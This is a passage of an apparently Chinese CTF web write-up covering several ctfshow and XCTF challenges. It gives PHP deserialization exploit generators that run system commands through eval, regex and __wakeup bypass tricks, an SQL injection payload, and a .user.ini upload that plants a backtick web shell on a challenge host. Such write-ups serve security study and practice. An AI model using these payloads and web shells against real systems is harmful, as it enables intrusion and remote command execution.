<p>需要注意的是，这里需要用tac命令显示flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=True;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;tac fla*&#x27;);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加了个正则过滤，并且把私有变量变成了<strong>public</strong>，(md改了好久的反序列化就是没法RCE，一看是public)</p>
<p>基本换汤不换药，注意正则匹配[oc]:\d+对于该结构的字符会做检测（不区分大小写），因此系列化后会检测到O:8:backDoor这种。查询资料发现绕过方式为&#x3D;&#x3D;数字前加上+号进行绕过&#x3D;&#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;1&#x27;;</span><br><span class="line">    public $password=&#x27;2&#x27;;</span><br><span class="line">    public $isVip=True;</span><br><span class="line">    public $class=&#x27;info&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;class=new backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class backDoor&#123;</span><br><span class="line">    public $code=&quot;system(&#x27;tac fla*&#x27;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$c=serialize(new ctfShowUser());</span><br><span class="line">$b=str_replace(&quot;O:11&quot;,&quot;O:+11&quot;,$c);</span><br><span class="line">$a=str_replace(&quot;O:8&quot;,&quot;O:+8&quot;,$b);</span><br><span class="line">echo urlencode($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>payload同上一题，换汤不换药。</p>
<h3 id="XCTF-Web-php-unserialize"><a href="#XCTF-Web-php-unserialize" class="headerlink" title="XCTF-Web_php_unserialize"></a>XCTF-Web_php_unserialize</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>同上一题，绕一个简单的正则匹配，绕一个__wakeup()的魔术方法。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Demo</span>());</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:4&quot;</span>,<span class="string">&quot;:+4&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:1:&quot;</span>,<span class="string">&quot;:2:&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第一个用+号绕过匹配<code>O:4</code>，后面一个当序列化中的属性数大于实际的属性数时，则可跳过wakeup魔法函数执行</p>
<p>因为该对象只有一个真实属性file而且是<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=private&spm=1001.2101.3001.7020">private</a>修饰的，因此我们将属性数改为2或者任何大于1的数即可</p>
<p>绕过__wakeup</p>
<h3 id="XCTF-Web-Cat"><a href="#XCTF-Web-Cat" class="headerlink" title="XCTF-Web-Cat"></a>XCTF-Web-Cat</h3><p>这题没质量，不好</p>
<p>直接放链接，本质上是一个ping，但是所有linux符号都被ban了，测试url输入发现%80（ASCII0-127）以上报错出信息，python，Django框架，直接放wp链接了<a target="_blank" rel="noopener" href="https://blog.csdn.net/zz_Caleb/article/details/95041031">WP</a></p>
<h2 id="大赛真题"><a href="#大赛真题" class="headerlink" title="大赛真题"></a>大赛真题</h2><h3 id="web680"><a href="#web680" class="headerlink" title="web680"></a>web680</h3><p>这里避个坑，bp传POST参数时候需要注意</p>
<ol>
<li>GET和POST同时存在时候，开头用POST</li>
<li>增加一行参数<code>Content-Type: application/x-www-form-urlencoded</code></li>
<li>结尾空一行再写POST参数以及内容</li>
</ol>
<p>对于该题，页面仅仅提示<code>post code to run</code>，构造POST传参<code>code=phpinfo();</code>，发现有回显，那直接命令执行呗</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=print_r(glob(&quot;*&quot;));</span><br></pre></td></tr></table></figure>

<p>发现一个文件</p>
<p><img src="/../images/CTF-web-2.assets/image-20230114001955690.png" alt="image-20230114001955690"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=highlight_file(&quot;secret_you_never_know&quot;);</span><br></pre></td></tr></table></figure>

<p>额，直接就出了。那换一种姿势，列举文件如果ban了glob()函数，还可以这么用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=var_dump(scandir(&quot;.&quot;));</span><br></pre></td></tr></table></figure>

<p><img src="/../images/CTF-web-2.assets/image-20230114002300755.png" alt="image-20230114002300755"></p>
<h3 id="web681"><a href="#web681" class="headerlink" title="web681"></a>web681</h3><p>蛮好玩的，会出来一个查询页面</p>
<p><img src="/../images/CTF-web-2.assets/image-20230114005331210.png" alt="image-20230114005331210"></p>
<p>开始盲测了几个，发现过长会被ban，且检测select关键字，猜想要构造才能绕过，但是需要我们知道对应的查询语句，页面中没有备份文件和源码泄露，但是bp抓包发送会返回其对应的语句</p>
<p><img src="/../images/CTF-web-2.assets/image-20230114005626997.png" alt="image-20230114005626997"></p>
<p>因为其过滤单引号，所以使用反斜杠将第一段和第二段第一个引号闭合，其实payload:<code>||1#\</code>等价于</p>
<p>where username &#x3D; ‘xxxxxx’||1#</p>
<p>即可绕过</p>
<p><img src="/../images/CTF-web-2.assets/image-20230114005850796.png" alt="image-20230114005850796"></p>
<h3 id="badhack"><a href="#badhack" class="headerlink" title="badhack"></a>badhack</h3><p><a target="_blank" rel="noopener" href="https://blog.h4ck.fun/roarctf2020-writeup/">链接如下</a></p>
<h3 id="baby杯-baby-php"><a href="#baby杯-baby-php" class="headerlink" title="baby杯-baby_php"></a>baby杯-baby_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-05-31 13:40:37</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-05-31 16:36:27</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fileUtil</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$content</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">        <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_upload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">waf</span>(<span class="variable">$this</span>-&gt;name) &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">waf</span>(<span class="variable">$this</span>-&gt;content))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;name, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php/i&#x27;</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_download</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/octet-stream&#x27;</span>);</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.<span class="variable">$this</span>-&gt;name.<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Transfer-Encoding: binary&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]?<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]:<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>===<span class="string">&#x27;upload&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Permission denied&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">        <span class="variable">$ft</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fileUtil</span>(<span class="variable">$name</span>,<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ft</span>-&gt;<span class="title function_ invoke__">file_upload</span>())&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&#x27; upload success!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;download&#x27;</span>:</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$ft</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fileUtil</span>(<span class="variable">$name</span>,<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ft</span>-&gt;<span class="title function_ invoke__">file_download</span>()===False)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&#x27; download failed&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;baby come on&#x27;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分析代码，用到了弱比较，当<code>a=0</code>的时候，会发现既能进入第一个case，也能进入第二个case</p>
<p>上面的类过滤php字符，file_put_contents函数会传入name和content两个POST参数</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://9532f966-c047-4cc8-9ab0-89e24c006b5e.challenge.ctf.show/?a=0</span><br><span class="line">name=.user.ini&amp;content=1.txt</span><br><span class="line"></span><br><span class="line">http://9532f966-c047-4cc8-9ab0-89e24c006b5e.challenge.ctf.show/?a=0</span><br><span class="line">name=1.txt&amp;content=&lt;?=`$_GET[1]`;?&gt;</span><br></pre></td></tr></table></figure>

<p>一级一级ls查询，确定flag路径</p>
<p><code>http://9532f966-c047-4cc8-9ab0-89e24c006b5e.challenge.ctf.show/?1=cat ../../../flag_baby_here_you_are</code></p>
<h3 id="七夕杯-repairman"><a href="#七夕杯-repairman" class="headerlink" title="七夕杯-repairman"></a>七夕杯-repairman</h3><p>这题还蛮不错的，访问默认进入?mode&#x3D;1的页面，接下来顺手试mode&#x3D;0会有源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;secret&#x27;</span>] = <span class="title function_ invoke__">Array</span>();</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$secret</span> =&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;secret&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$secret</span> = Null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span 